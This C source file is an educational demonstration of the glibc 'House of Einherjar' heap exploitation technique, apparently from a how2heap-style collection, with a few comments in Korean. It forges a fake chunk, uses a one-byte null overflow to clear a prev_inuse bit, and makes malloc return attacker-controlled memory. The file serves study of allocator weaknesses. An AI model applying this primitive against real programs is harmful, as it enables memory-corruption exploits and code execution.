#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

/*
   Credit to st4g3r for publishing this technique
   The House of Enherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc()
   This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak. 
*/

int main()
{
  	printf("Welcome to House of Einherjar!\n");
  	printf("Tested in Ubuntu 16.04 64bit.\n");
  	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
  
  	uint8_t* a;
  	uint8_t* b;
  	uint8_t* d;
  
  	printf("\nWe allocate 0x38 bytes for 'a'\n");
  	a = (uint8_t*) malloc(0x38);
  	printf("a: %p\n", a);
    
    int real_a_size = malloc_usable_size(a);
    printf("Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);

    size_t fake_chunk[6];

    // 언제 추가된 check인지는 모르겠지만, 지금은 안해도 잘 돌아간다.
    // fake_chunk[0] = 0x0; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
    // fake_chunk[1] = 0x100; // 지긍믄 size check도 안한다.
    fake_chunk[2] = (size_t) fake_chunk; // fd
    fake_chunk[3] = (size_t) fake_chunk; // bk
    fake_chunk[4] = (size_t) fake_chunk; // fd_nextsize
    fake_chunk[5] = (size_t) fake_chunk; // bk_nextsize
    
    
    printf("Our fake chunk at %p looks like:\n", fake_chunk);
    printf("prev_size : %#lx\n", fake_chunk[0]);
    printf("size: %#lx\n", fake_chunk[1]);
    printf("fwd: %#lx\n", fake_chunk[2]);
    printf("bck: %#lx\n", fake_chunk[3]);
    printf("fwd_nextsize: %#lx\n", fake_chunk[4]);
    printf("bck_nextsize: %#lx\n", fake_chunk[5]);

  	/* In this case it is easier if the chunk size attribute has a least significant byte with
  	 * a value of 0x00. The least significant byte of this will be 0x00, because the size of 
  	 * the chunk includes the amount requested plus some amount required for the metadata. */
  	b = (uint8_t*) malloc(0xf8);
      int real_b_size = malloc_usable_size(b);
  
  	printf("\nWe allocate 0xf8 bytes for 'b'.\n");
  	printf("b: %p\n", b);
  
  	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
      /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/
  
  	printf("\nb.size: %#lx\n", *b_size_ptr);
  	printf("b.size is: (0x100) | prev_inuse = 0x101\n");
  	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
  	a[real_a_size] = 0; 
  	printf("b.size: %#lx\n", *b_size_ptr);
    printf("This is easiest if b.size is a multiple of 0x100 so you "
           "don't change the size of b, only its prev_inuse bit\n");
    printf("If it had been modified, we would need a fake chunk inside "
           "b where it will try to consolidate the next chunk\n");

    // Write a fake prev_size to the end of a
    printf("\nWe write a fake prev_size to the last %lu bytes of a so that "
           "it will consolidate with our fake chunk\n", sizeof(size_t));
    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    printf("Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
    *(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;


    // 언제 추가된 check인지는 모르겠지만, 지금은 안해도 잘 돌아간다.
    // printf("\nModify fake chunk's size to reflect b's new prev_size\n");
    // fake_chunk[1] = fake_size;
    

    // free b and it will consolidate with our fake chunk
    printf("Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
    free(b);
    printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

    printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
    d = malloc(0x200);
    printf("Next malloc(0x200) is at %p\n", d);
}
